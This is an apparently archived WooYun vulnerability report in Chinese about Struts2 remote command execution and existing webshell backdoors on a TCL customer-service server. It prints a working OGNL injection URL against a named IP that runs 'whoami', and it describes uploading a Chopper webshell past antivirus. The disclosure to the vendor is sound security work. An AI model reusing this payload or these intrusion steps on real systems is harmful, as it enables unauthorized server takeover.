{"id": 39968, "wybug_id": "wooyun-2015-092788", "wybug_title": "TCL某站点高危漏洞发现多处后门", "wybug_corp": "TCL官方网上商城", "wybug_author": "路人甲", "wybug_date": "2015-01-20 17:19", "wybug_open_date": "2015-03-06 17:20", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方框架", "远程命令执行", "第三方不可信程序", "补丁不及时", "远程代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-06：\t细节向公众公开  简要描述： TCL某站点高危漏洞发现多处后门 详细说明：  1.是这个站点：TCL员工商城客服站点http://125.93.53.79:9080/TaskService/webChatAndLeaveWord.action?entranceid=www.mypengpeng.com&status=0&agentId=&tenantID=981&groupid=46404&clientURL=&clientIP=\n\n2.看连接，应该是用的struts2，验证了下，果然存在漏洞：http://125.93.53.79:9080/TaskService/webChatAndLeaveWord.action?tenantID=981&groupid=46404&redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{%27whoami%27})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}返回得到用户为：\nwebchatx64\\administrator\n3.但是拿不到shell，很郁闷！！！到很后来才发现是由杀毒软件，上传的shell都被干掉了。前面对着网站扫描了下，发现如下文件，除了index.jsp那个几乎都是webshell了：\n\n4.前面几个大小相当，估计是菜刀后门，dada.jsp和aaa.jsp访问如下：\n\n\n\n5.随手写了个内容\"1“，发现文件写成功了，这个时候意识到杀软了。菜刀自带的jsp shell肯定是被干掉了。拿起园长的菜刀：\n\n6.拿到权限后，看到了几个后门的密码，也是醉了。   漏洞证明：  见详细说明   修复方案：  问题还是很严重的，赶紧删除后门以及升级版本   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-01-20 17:30 厂商回复： 感谢你的工作，已转交相关单位处理，谢谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}